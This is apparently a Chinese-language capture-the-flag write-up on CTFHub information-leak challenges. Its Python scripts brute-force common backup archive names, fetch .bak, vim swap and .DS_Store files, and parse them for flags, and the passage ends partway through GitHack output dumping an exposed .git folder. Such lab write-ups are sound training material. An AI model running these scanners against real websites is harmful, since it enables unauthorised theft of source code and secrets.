<span class="token comment" spellcheck="true"># -*- coding: utf-8 -*- </span>
<span class="token comment" spellcheck="true"># --author：valecalida--</span>
<span class="token comment" spellcheck="true"># Edit time: 2020/4/5 16:12</span>
<span class="token keyword">from</span> requests <span class="token keyword">import</span> RequestException
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> zipfile
<span class="token keyword">import</span> random
<span class="token keyword">import</span> os
<span class="token keyword">import</span> re


<span class="token keyword">def</span> <span class="token function">get_user_agent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    user_agent <span class="token operator">=</span> <span class="token punctuation">[</span>
        <span class="token string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6"</span><span class="token punctuation">,</span>
        <span class="token string">"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1"</span><span class="token punctuation">,</span>
        <span class="token string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5"</span><span class="token punctuation">,</span>
        <span class="token string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1"</span>
        <span class="token string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6"</span><span class="token punctuation">,</span>
        <span class="token string">"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5"</span><span class="token punctuation">,</span>
        <span class="token string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3"</span><span class="token punctuation">,</span>
        <span class="token string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3"</span><span class="token punctuation">,</span>
        <span class="token string">"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3"</span><span class="token punctuation">,</span>
        <span class="token string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3"</span><span class="token punctuation">,</span>
        <span class="token string">"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3"</span><span class="token punctuation">,</span>
        <span class="token string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3"</span><span class="token punctuation">,</span>
        <span class="token string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3"</span><span class="token punctuation">,</span>
        <span class="token string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3"</span><span class="token punctuation">,</span>
        <span class="token string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"</span><span class="token punctuation">,</span>
        <span class="token string">"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"</span>
    <span class="token punctuation">]</span>
    <span class="token keyword">return</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>user_agent<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">unzip_file</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>
    zip_src <span class="token operator">=</span> os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\\"</span> <span class="token operator">+</span> name
    <span class="token keyword">if</span> <span class="token operator">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token string">'unzip_folder'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span><span class="token string">'unzip_folder'</span><span class="token punctuation">)</span>
    r <span class="token operator">=</span> zipfile<span class="token punctuation">.</span>is_zipfile<span class="token punctuation">(</span>zip_src<span class="token punctuation">)</span>
    <span class="token keyword">if</span> r<span class="token punctuation">:</span>
        fz <span class="token operator">=</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span>zip_src<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> file <span class="token keyword">in</span> fz<span class="token punctuation">.</span>namelist<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            fz<span class="token punctuation">.</span>extract<span class="token punctuation">(</span>file<span class="token punctuation">,</span> <span class="token string">"unzip_folder"</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] 解压%s到文件夹%s完成"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>name<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[-] 看起来解压的过程中出现了一点问题'</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">get_flag</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    folder <span class="token operator">=</span> os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\\"</span> <span class="token operator">+</span> <span class="token string">'unzip_folder'</span>
    dir_list <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>folder<span class="token punctuation">)</span>
    <span class="token keyword">for</span> line <span class="token keyword">in</span> dir_list<span class="token punctuation">:</span>
        <span class="token keyword">if</span> line <span class="token operator">!=</span> <span class="token string">"index.html"</span><span class="token punctuation">:</span>
            header <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"User-Agent"</span><span class="token punctuation">:</span> get_user_agent<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> line<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">)</span>
            <span class="token keyword">except</span> RequestException<span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                flag <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">"^ctfhub{.*}"</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
                <span class="token keyword">if</span> len<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">:</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] 最终flag为："</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">process_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    name_list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'rar'</span><span class="token punctuation">,</span> <span class="token string">'tar.gz'</span><span class="token punctuation">,</span> <span class="token string">'tar'</span><span class="token punctuation">,</span> <span class="token string">'zip'</span><span class="token punctuation">]</span>
    name_list2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'web'</span><span class="token punctuation">,</span> <span class="token string">'website'</span><span class="token punctuation">,</span> <span class="token string">'backup'</span><span class="token punctuation">,</span> <span class="token string">'back'</span><span class="token punctuation">,</span> <span class="token string">'www'</span><span class="token punctuation">,</span> <span class="token string">'wwwroot'</span><span class="token punctuation">,</span> <span class="token string">'temp'</span><span class="token punctuation">]</span>
    name_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> name1 <span class="token keyword">in</span> name_list1<span class="token punctuation">:</span>
        <span class="token keyword">for</span> name2 <span class="token keyword">in</span> name_list2<span class="token punctuation">:</span>
            name_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>name2 <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> name1<span class="token punctuation">)</span>
    <span class="token keyword">return</span> name_list


<span class="token keyword">def</span> <span class="token function">get_zipfile</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    f <span class="token operator">=</span> open<span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span>
    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
    f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] 写入 %s完成！"</span> <span class="token operator">%</span> name<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    names <span class="token operator">=</span> process_name<span class="token punctuation">(</span><span class="token punctuation">)</span>
    url <span class="token operator">=</span> <span class="token string">"http://challenge-52e23664acf37dae.sandbox.ctfhub.com:10080/"</span>
    <span class="token keyword">for</span> name <span class="token keyword">in</span> names<span class="token punctuation">:</span>
        header <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"User-Agent"</span><span class="token punctuation">:</span> get_user_agent<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> name<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">)</span>
        <span class="token keyword">except</span> RequestException<span class="token punctuation">:</span>
            <span class="token keyword">pass</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> res<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
                content <span class="token operator">=</span> res<span class="token punctuation">.</span>content
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] 检测到了%s,正在下载..."</span> <span class="token operator">%</span> name<span class="token punctuation">)</span>
                get_zipfile<span class="token punctuation">(</span>name<span class="token punctuation">,</span> content<span class="token punctuation">)</span>
                unzip_file<span class="token punctuation">(</span>name<span class="token punctuation">)</span>
                get_flag<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token keyword">continue</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>运行得到的结果是</p>
<pre class="line-numbers language-bash"><code class="language-bash">检测到了www.zip 正在下载<span class="token punctuation">..</span>.
下载完成
解压完成
获取到的flag为：ctfhub<span class="token punctuation">{</span>a0f7e3a2630c76950dbceb4bad4f088cfd2efcb7<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="3-2、bak文件"><a href="#3-2、bak文件" class="headerlink" title="3.2、bak文件"></a>3.2、bak文件</h4><p>​        当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python3</span>
<span class="token comment" spellcheck="true"># -*- coding: utf-8 -*- </span>
<span class="token comment" spellcheck="true"># --author：valecalida--</span>
<span class="token comment" spellcheck="true"># Edit time: 2020/4/5 16:59</span>
<span class="token keyword">from</span> requests <span class="token keyword">import</span> RequestException
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> random
<span class="token keyword">import</span> re


<span class="token keyword">def</span> <span class="token function">get_user_agent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    user_agent <span class="token operator">=</span> <span class="token punctuation">[</span>
        <span class="token string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6"</span><span class="token punctuation">,</span>
        <span class="token string">"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1"</span><span class="token punctuation">,</span>
        <span class="token string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5"</span><span class="token punctuation">,</span>
        <span class="token string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1"</span>
        <span class="token string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6"</span><span class="token punctuation">,</span>
        <span class="token string">"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5"</span><span class="token punctuation">,</span>
        <span class="token string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3"</span><span class="token punctuation">,</span>
        <span class="token string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3"</span><span class="token punctuation">,</span>
        <span class="token string">"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3"</span><span class="token punctuation">,</span>
        <span class="token string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3"</span><span class="token punctuation">,</span>
        <span class="token string">"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3"</span><span class="token punctuation">,</span>
        <span class="token string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3"</span><span class="token punctuation">,</span>
        <span class="token string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3"</span><span class="token punctuation">,</span>
        <span class="token string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3"</span><span class="token punctuation">,</span>
        <span class="token string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"</span><span class="token punctuation">,</span>
        <span class="token string">"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"</span>
    <span class="token punctuation">]</span>
    <span class="token keyword">return</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>user_agent<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> <span class="token string">"http://challenge-dc76a806659c9dd9.sandbox.ctfhub.com:10080/"</span>
    bak <span class="token operator">=</span> <span class="token string">'index.php.bak'</span>
    header <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'User-Agent'</span> <span class="token punctuation">:</span> get_user_agent<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> bak<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">)</span>
    <span class="token keyword">except</span> RequestException<span class="token punctuation">:</span>
        <span class="token keyword">pass</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">".*(ctfhub{.*})"</span><span class="token punctuation">,</span> res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>运行得到的结果是</p>
<pre class="line-numbers language-bash"><code class="language-bash">ctfhub<span class="token punctuation">{</span>2235cea3ec81eb9569f4604251fe8a7120b95049<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h4 id="3-3、vim缓存"><a href="#3-3、vim缓存" class="headerlink" title="3.3、vim缓存"></a>3.3、vim缓存</h4><p>​        当开发人员在线上环境中使用 vim 编辑器，在使用过程中会留下 vim 编辑器缓存，当vim异常退出时，缓存会一直留在服务器上，引起网站源码泄露。</p>
<p>通常 <code>vim</code> 的备份文件有：</p>
<ol>
<li><strong><code>.filename.swp</code></strong></li>
<li><strong><code>filename~</code></strong></li>
<li><strong><code>.filename.un.~</code></strong></li>
</ol>
<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python3</span>
<span class="token comment" spellcheck="true"># -*- coding: utf-8 -*- </span>
<span class="token comment" spellcheck="true"># --author：valecalida--</span>
<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>request <span class="token keyword">as</span> ur<span class="token punctuation">,</span> urllib<span class="token punctuation">.</span>parse
<span class="token keyword">import</span> zipfile<span class="token punctuation">,</span> os
<span class="token keyword">import</span> re
rr <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span>r<span class="token string">'\bctfhub{.*}'</span><span class="token punctuation">,</span> re<span class="token punctuation">.</span>I<span class="token punctuation">)</span>


res <span class="token operator">=</span> ur<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span><span class="token string">'http://challenge-5aa8b1e1be6c5d78.sandbox.ctfhub.com:10080/.index.php.swp'</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>str<span class="token punctuation">(</span>rr<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>str<span class="token punctuation">(</span>res<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>运行得到的结果是</p>
<pre class="line-numbers language-bash"><code class="language-bash">ctfhub<span class="token punctuation">{</span>67e244df614a707bf252d60711afef3767e41492<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h4 id="3-4、-DS-Store"><a href="#3-4、-DS-Store" class="headerlink" title="3.4、.DS_Store"></a>3.4、.DS_Store</h4><p>​        <code>.DS_Store</code> 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。</p>
<p>这里通过下面的地址直接获取到文件</p>
<pre class="line-numbers language-bash"><code class="language-bash">http://challenge-3092fd23a1d60f94.sandbox.ctfhub.com:10080/.DS_Store<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后通过Linux命令获取文件内容</p>
<pre class="line-numbers language-bash"><code class="language-bash">xxd -p DS_Store <span class="token operator">|</span> <span class="token function">sed</span> <span class="token string">'s/00//g'</span> <span class="token operator">|</span> <span class="token function">tr</span> -d <span class="token string">'\n'</span> <span class="token operator">|</span> <span class="token function">sed</span> <span class="token string">'s/\([0-9A-F]\{2\}\)/0x\1 /g'</span> <span class="token operator">|</span> xxd -r -p <span class="token operator">|</span> strings <span class="token operator">|</span> <span class="token function">sed</span> <span class="token string">'s/ptb[LN]ustr//g'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>得到的结果如下</p>
<pre class="line-numbers language-bash"><code class="language-bash">Bud1
DSDB
<span class="token variable">$e536ae211065e6cb535b1a8080a2baa3</span>.txtnoteustr
flag here<span class="token operator">!</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>接着构建脚本</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python3</span>
<span class="token comment" spellcheck="true"># -*- coding: utf-8 -*- </span>
<span class="token comment" spellcheck="true"># --author：valecalida--</span>
<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>request <span class="token keyword">as</span> ur
res <span class="token operator">=</span> ur<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span><span class="token string">'http://challenge-3092fd23a1d60f94.sandbox.ctfhub.com:10080/e536ae211065e6cb535b1a8080a2baa3.txt'</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>运行得到的结果是</p>
<pre class="line-numbers language-bash"><code class="language-bash">ctfhub<span class="token punctuation">{</span>b00feb505c3f4e6df73d8612c76bd5deb5aa4475<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="4、Git泄露"><a href="#4、Git泄露" class="headerlink" title="4、Git泄露"></a>4、Git泄露</h3><h4 id="4-1、Log"><a href="#4-1、Log" class="headerlink" title="4.1、Log"></a>4.1、Log</h4><p>​        当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。</p>
<pre class="line-numbers language-bash"><code class="language-bash">➜  GitHack-master python GitHack.py http://challenge-426b1b2da4ddd315.sandbox.ctfhub.com:10080/.git/

  ____ _ _   _   _            _
 / ___<span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> __ _  ___<span class="token operator">|</span> <span class="token operator">|</span> __
<span class="token operator">|</span> <span class="token operator">|</span>  _<span class="token operator">|</span> <span class="token operator">|</span> __<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>/ _` <span class="token operator">|</span>/ __<span class="token operator">|</span> <span class="token operator">|</span>/ /
<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>  _  <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>__<span class="token operator">|</span>   <span class="token operator">&lt;</span>
 \____<span class="token operator">|</span>_<span class="token operator">|</span>\__<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>\__,_<span class="token operator">|</span>\___<span class="token operator">|</span>_<span class="token operator">|</span>\_\<span class="token punctuation">{</span>0.0.5<span class="token punctuation">}</span>
 A <span class="token string">'.git'</span> folder disclosure exploit.

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Check Depends
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Check depends end
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Set Paths
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Target Url: http://challenge-426b1b2da4ddd315.sandbox.ctfhub.com:10080/.git/
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Initialize Target
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Try to Clone straightly
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Clone
Cloning into <span class="token string">'/mnt/c/Users/BinSec/Downloads/Compressed/GitHack-master/GitHack-master/dist/challenge-426b1b2da4ddd315.sandbox.ctfhub.com_10080'</span><span class="token punctuation">..</span>.
fatal: repository <span class="token string">'http://challenge-426b1b2da4ddd315.sandbox.ctfhub.com:10080/.git/'</span> not found
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> Clone Error
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Try to Clone with Directory Listing
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> http://challenge-426b1b2da4ddd315.sandbox.ctfhub.com:10080/.git/ is not support Directory Listing
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> <span class="token punctuation">[</span>Skip<span class="token punctuation">]</span><span class="token punctuation">[</span>First Try<span class="token punctuation">]</span> Target is not support Directory Listing
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Try to clone with Cache
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Initialize Git
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Cache files
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> packed-refs
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> config
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> HEAD
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> COMMIT_EDITMSG
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> ORIG_HEAD
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> FETCH_HEAD
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> refs/heads/master
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> refs/remote/master
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> index
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> logs/HEAD
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> logs/refs/heads/master
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Fetch Commit Objects
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/b5/aa9e47f5f2a2b02e23da913c5137976e36a716
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/01/2ae1fc6b838a345b689ae6bb4ec0edfd517a64
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/90/f6b210fccb96c831fb0149bd777d02f2fdc5b9
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/9d/aceca66ad6be96b31ab966d60ca6e6beb02ebb
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/90/71e0a24f654c88aa97a2273ca595e301b7ada5
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/2c/59e3024e3bc350976778204928a21d9ff42d01
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/ba/69d13b39c28abea7f0f7865d83d8cb6aa83b10
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/ac/48499ac2bda260e59471019e8506a71980f5a2
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Fetch Commit Objects End
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> logs/refs/remote/master
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> logs/refs/stash
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> refs/stash
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Valid Repository
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Valid Repository Success

